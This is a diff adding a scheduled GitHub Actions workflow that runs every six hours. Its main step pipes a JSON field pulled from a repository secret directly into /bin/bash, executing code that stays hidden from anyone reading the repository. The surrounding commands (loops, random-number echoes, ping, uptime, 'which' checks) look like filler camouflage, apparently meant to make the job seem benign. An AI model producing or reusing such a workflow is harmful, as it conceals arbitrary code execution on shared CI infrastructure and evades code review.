@@ -1,0 +1,33 @@
+name: yanshensu1986
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanshensu1986
+        env:
+          b17463: ${{ secrets.b17463 }}
+        run: |
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo $b17463 | jq -r .n2060 | /bin/bash
+          which wget
+          ls -al | awk '{print $NF}'
+          : ' Another single-line comment '
+          curl google.com
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          which curl
+          uname -a
+          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
+          echo "Date only: $(date +%F)"
+          which apt-get
+          rm -rf tmp.temp.my.scrip.orc.zzz
+          ping -c 10 google.com
+          echo "Time: $(date +%H:%M:%S)"
